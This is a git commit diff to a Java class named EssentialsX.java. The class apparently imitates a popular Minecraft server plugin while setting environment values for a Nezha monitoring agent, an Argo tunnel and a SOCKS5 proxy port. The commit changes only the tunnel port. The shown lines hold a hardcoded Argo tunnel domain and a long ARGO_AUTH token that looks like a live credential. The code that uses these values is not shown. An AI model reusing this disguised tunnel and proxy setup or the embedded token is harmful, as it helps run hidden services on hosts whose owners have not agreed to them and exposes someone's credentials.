e9a6849e8b2fa1db87c308cde5a34b05a94851d8
kuisa <32757027+kuisa@users.noreply.github.com>
2026-05-26 14:08:16 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -78,7 +78,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "8001");
+        env.put("ARGO_PORT", "54458");
         env.put("ARGO_DOMAIN", "cereshost.free.us.kg");
         env.put("ARGO_AUTH", "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiNmFlZWZkY2UtN2ZiMi00NDFjLTkwOTMtMjIzMzZkNzhjZDk1IiwicyI6Ik5tVmtOek00Tm1VdE5XSXdZUzAwTXpNd0xUazVNbVl0WlRZeE1EQmtaRGt4WkRFNSJ9");
         env.put("S5_PORT", "28194");
